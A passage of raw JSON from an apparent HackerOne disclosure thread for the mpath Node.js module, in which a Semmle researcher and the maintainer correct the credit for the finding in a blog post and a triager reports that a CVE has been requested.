class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-03T21:54:27.398Z","updated_at":"2018-12-03T21:54:27.398Z","actor":{"username":"vkarpov15","cleared":false,"url":"/vkarpov15","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3756458,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Nice! One question, though: you credit the vulnerability to the Node.js Security Group; did I miss something about them reporting this bug before us? (I'm with the Semmle Security Research Team, not the Node.js Security Group.)","markdown_message":"\u003cp\u003eNice! One question, though: you credit the vulnerability to the Node.js Security Group; did I miss something about them reporting this bug before us? (I\u0026#39;m with the Semmle Security Research Team, not the Node.js Security Group.)\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-04T07:59:53.426Z","updated_at":"2018-12-04T07:59:53.426Z","actor":{"username":"cris_semmle","cleared":false,"url":"/cris_semmle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/320/894/63a7168e6cfdfe973d7e4efc96fbc6088b092fd2_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3756460,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Btw, @e_lexy, you said you'd request a CVE, how is that going?","markdown_message":"\u003cp\u003eBtw, \u003ca href=\"/e_lexy\"\u003e@e_lexy\u003c/a\u003e, you said you\u0026#39;d request a CVE, how is that going?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-04T08:00:38.109Z","updated_at":"2018-12-04T08:00:38.109Z","actor":{"username":"cris_semmle","cleared":false,"url":"/cris_semmle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/320/894/63a7168e6cfdfe973d7e4efc96fbc6088b092fd2_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3758593,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@cris_semmle that's my mistake. @e_lexy was the one that originally reached out to me and said he was from the Node.js Security Group, so I assumed you were part of that organization as well. I'm happy to update the blog post to link to your site. Is this the correct one? https://semmle.com/security","markdown_message":"\u003cp\u003e\u003ca href=\"/cris_semmle\"\u003e@cris_semmle\u003c/a\u003e that\u0026#39;s my mistake. \u003ca href=\"/e_lexy\"\u003e@e_lexy\u003c/a\u003e was the one that originally reached out to me and said he was from the Node.js Security Group, so I assumed you were part of that organization as well. I\u0026#39;m happy to update the blog post to link to your site. Is this the correct one? \u003ca title=\"https://semmle.com/security\" href=\"/redirect?url=https%3A%2F%2Fsemmle.com%2Fsecurity\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://semmle.com/security\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-04T13:49:41.675Z","updated_at":"2018-12-04T13:49:41.675Z","actor":{"username":"vkarpov15","cleared":false,"url":"/vkarpov15","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3758682,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"That's right, yes. Thanks, Valeri!","markdown_message":"\u003cp\u003eThat\u0026#39;s right, yes. Thanks, Valeri!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-04T14:05:53.026Z","updated_at":"2018-12-04T14:05:53.026Z","actor":{"username":"cris_semmle","cleared":false,"url":"/cris_semmle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/320/894/63a7168e6cfdfe973d7e4efc96fbc6088b092fd2_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3763454,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I updated the blog post @cris_semmle , thanks for pointing that out and thanks for finding this issue.","markdown_message":"\u003cp\u003eI updated the blog post \u003ca href=\"/cris_semmle\"\u003e@cris_semmle\u003c/a\u003e , thanks for pointing that out and thanks for finding this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-04T20:57:59.323Z","updated_at":"2018-12-04T20:57:59.323Z","actor":{"username":"vkarpov15","cleared":false,"url":"/vkarpov15","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3920686,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-03T16:42:04.192Z","updated_at":"2019-01-03T16:42:04.192Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"old_scope":"Other module","new_scope":"mpath","genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3921141,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry for the delay @cris_semmle, CVE requested now that this has been disclosed.","markdown_message":"\u003cp\u003eSorry for the delay \u003ca href=\"/cris_semmle\"\u003e@cris_semmle\u003c/a\u003e, CVE requested now that this has been disclosed.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-03T18:11:14.697Z","updated_at":"2019-01-03T18:11:14.697Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}